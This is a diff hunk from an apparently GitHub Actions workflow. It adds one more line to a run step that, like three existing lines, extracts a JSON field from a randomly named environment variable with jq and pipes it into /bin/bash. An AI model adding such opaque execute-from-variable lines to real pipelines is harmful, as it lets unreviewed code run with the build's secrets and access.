@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$m17" | jq -r .kaeji0 | /bin/bash
           echo $aok4 | jq -r .tl06076 | /bin/bash
           echo $cokxf57630 | jq -r .v228 | /bin/bash
+          echo $lsg6 | jq -r .m64 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
